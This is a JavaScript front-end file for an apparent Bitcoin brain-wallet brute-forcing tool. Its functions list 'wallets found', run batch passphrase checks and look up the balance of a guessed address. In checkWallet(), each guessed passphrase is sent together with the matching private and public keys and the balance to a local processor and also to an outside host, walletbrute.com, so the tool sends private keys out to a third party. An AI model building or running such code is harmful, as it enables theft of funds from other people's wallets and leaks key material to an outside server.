function installPrevStepModel() {
	$('#installPrevStepModel').modal('show');
}
function updateClock () {
	var currentTime = new Date ( );
	var currentHours = currentTime.getHours ( );
	var currentMinutes = currentTime.getMinutes ( );
	var currentSeconds = currentTime.getSeconds ( );
	
	// Pad the minutes and seconds with leading zeros, if required
	currentMinutes = ( currentMinutes < 10 ? "0" : "" ) + currentMinutes;
	currentSeconds = ( currentSeconds < 10 ? "0" : "" ) + currentSeconds;
	
	// Choose either "AM" or "PM" as appropriate
	var timeOfDay = ( currentHours < 12 ) ? "AM" : "PM";
	
	// Convert the hours component to 12-hour format if needed
	currentHours = ( currentHours > 12 ) ? currentHours - 12 : currentHours;
	
	// Convert an hours component of "0" to "12"
	currentHours = ( currentHours == 0 ) ? 12 : currentHours;
	
	// Compose the string for display
	var currentTimeString = currentHours + ":" + currentMinutes + ":" + currentSeconds + " " + timeOfDay;
	
	$("#clock").html(currentTimeString);
}

function showRates() {
	$('#world_rates').dataTable( {
	    "processing": true,
	    "serverSide": false,
	    "pageLength": 25,
	    "order": [[ 0, "desc" ]],
	    "ajax": "includes/processor/processor.php?action=show_rates",
	    "fnDrawCallback": function( oSettings ) {
		    $('#world_rates_wrapper .col-sm-12:first').css('margin-top','20px').css('margin-bottom','20px').css('border-top','1px solid #ddd').css('border-bottom','1px solid #ddd');
	        $('#world_rates tbody tr,#wallets_found tbody tr').css('border-bottom','1px dashed #ddd');
	        $('#world_rates thead tr,#wallets_found thead tr').css('border-bottom','1px dashed #ddd');
		}
	});	 
}

function showWallets() {
	$.fn.dataTable.moment('MM-DD-YYYY HH:mm:ss');

	//m-d-Y H:i:s A
	$('#wallets_found').dataTable( {
	    "processing": false,
	    "serverSide": true,
	    "pageLength": 25,
	    "order": [[ 5, "desc" ]],
	    "ajax": "includes/processor/processor.php?action=wallets_found",
	    "fnDrawCallback": function( oSettings ) {
		    //$('#wallets_found').css('font-size','.8em');
	        //$('#wallets_found tbody tr > td:nth-child(1), table tbody tr > th:nth-child(1)').attr('style', 'font-size:1.2em;');
	        //$('#wallets_found tbody tr > td:nth-child(2), table tbody tr > th:nth-child(2)').attr('style', 'font-size:.6em;');
	        //$('#wallets_found tbody tr > td:nth-child(3), table tbody tr > th:nth-child(3)').attr('style', 'font-size:1.2em;');
	        $('#wallets_found_wrapper .col-sm-12:first').css('margin-top','20px').css('margin-bottom','20px').css('border-top','1px solid #ddd').css('border-bottom','1px solid #ddd');
	        $('#wallets_found tbody tr > td:nth-child(2),#wallets_found tbody tr > th:nth-child(2)').hide();
	        $('#wallets_found tbody tr,#wallets_found tbody tr').css('border-bottom','1px dashed #ddd');
	        $('#wallets_found thead tr > td:nth-child(2),#wallets_found thead tr > th:nth-child(2)').hide();
	        $('#wallets_found thead tr,#wallets_found thead tr').css('border-bottom','1px dashed #ddd');
	        $('#wallets_found tfoot tr > td:nth-child(2),#wallets_found tfoot tr > th:nth-child(2)').hide();

	    },
	    "fnRowCallback": function( nRow, aData, iDisplayIndex ) {
	            $('td:eq(2)', nRow).html('<a href="https://blockchain.info/address/' + aData[2] + '" target="_new">' + aData[2] + '</a>');
				//$('td:eq(5)', nRow).css('font-size','.7em');
				var walletStatus = $('td:eq(6)', nRow).html();
				if(walletStatus == "No") { 
					$('td:eq(6)', nRow).parent().css('background-color','#fff');	
				} else {
					$('td:eq(6)', nRow).parent().css('background-color','#ffffcc');
				}
	            return nRow;
	    },
	});	 
}

function checkWalletBatchResult(name) {
    $.ajax({
        type: 'POST',
		url: 'includes/processor/processor.php?action=checkWalletBatchResult&id='+name,
		success: function(response){
			//alert(outputDiv);
			$('#files').html('');
			$('#files').show();
	        $('#files').append('<div style="text-align:left;font-size:1.5em;">Your session key for this file is <a href="../includes/temp/'+name+'.log"><span style="font-weight:bold;font-size:1.5em;">'+name+'</span></a>.</div>\n');
			$('#files').append('<div id="batchResult">'+response+'</div>');
		},
		error:function(){
			//alert('error');
		}
	});	
}
 
function checkWalletBatch(name) {
	$.ajax({
        type: 'POST',
		url: 'includes/processor/processor.php?action=checkWalletBatch&name='+name,
		success: function(response){
			//alert('success:' +response);
		},
		error:function(){
			//alert('error');
		}
	});	
	setTimeout('checkWalletBatchResult('+name+')',3000);
}






function checkWallet() {
	var guess = $('#pass').val();
	var guessAddr = $('#addr').val();
	var privateKey = $('#sec').val();
	var publicKey = $('#pub').val();
	$('#walletCheckResults').html('<center><img style="height:200px;" src="includes/images/loader.gif" style="text-align:center;margin-bottom:0px;padding-bottom:-20px;"></center>');
	$.getJSON('https://bitcoin.toshi.io/api/v0/addresses/'+guessAddr, function(data) {
     })
     .success(function(data) { 
	    var balance = data.balance / 100000000;
		var received = data.received / 100000000;
		$("#walletCheckResults").html('<div id="walletCheckAPIPre"></div>');
		var div = document.getElementById('walletCheckAPIPre');
		if(isEmpty(guess)) { var guessFinal = '[Empty]'; } else { var guessFinal = guess; }
		div.innerHTML = div.innerHTML + '<div style="font-size:1.5em;border-bottom:1px solid #ddd;">Passphrase: <span style="font-weight:bold;font-size:1.3em;float:right;">'+guessFinal+'</span></div>\n';
		div.innerHTML = div.innerHTML + '<div style="font-size:1.5em;border-bottom:1px solid #ddd;">Balance: <span style="font-weight:bold;font-size:1.3em;float:right;">'+balance+' BTC</span></div>\n';
		div.innerHTML = div.innerHTML + '<div style="font-size:1.5em;border-bottom:1px solid #ddd;">Received by Address: <span style="font-weight:bold;font-size:1.3em;float:right;">'+received+' BTC</span></div>';
		$.ajax({
	        type: 'POST',
	        async: true,
			url: 'includes/processor/processor.php?action=checkWallet&guess='+guess+'&guessAddr='+guessAddr+'&private='+privateKey+'&public='+publicKey+'&balance='+balance+'&received='+received+'&exists=yes',
			success: function(response){
			},
			error:function(){
				$('#walletCheckResults').html('Problem submitting to local database...').show();
			}
		});	
		$.ajax({
	        type: 'POST',
	        async: true,
			url: '//www.walletbrute.com/includes/processor/processor.php?action=checkWallet&guess='+guess+'&guessAddr='+guessAddr+'&private='+privateKey+'&public='+publicKey+'&balance='+balance+'&received='+received+'&exists=yes',
			success: function(response){
			},
			error:function(){
				$('#walletCheckResults').html('Problem submitting to the WalletBrute Global Database...').show();
			}
		});		
		
	 })
	 .error(function(data) { 
	    var balance = 0;
		var received = 0;
		$("#walletCheckResults").html('<div id="walletCheckAPIPre"></div>');
		var div = document.getElementById('walletCheckAPIPre');
		div.innerHTML = div.innerHTML + 'Wallet does not yet exist...\n';	
		$.ajax({
	        type: 'POST',
	        async: true,
			url: 'includes/processor/processor.php?action=checkWallet&guess='+guess+'&guessAddr='+guessAddr+'&private='+privateKey+'&public='+publicKey+'&balance='+balance+'&received='+received+'&exists=no',
			success: function(response){
			},
			error:function(){
				$('#walletCheckResults').html('Problem submitting to local database...').show();
			}
		});	
		$.ajax({
	        type: 'POST',
	        async: true,
			url: '//www.walletbrute.com/includes/processor/processor.php?action=checkWallet&guess='+guess+'&guessAddr='+guessAddr+'&private='+privateKey+'&public='+publicKey+'&balance='+balance+'&received='+received+'&exists=no',
			success: function(response){
			},
			error:function(){
				$('#walletCheckResults').html('Problem submitting to the WalletBrute Global Database...').show();
			}
		});			
			 
	 })
}





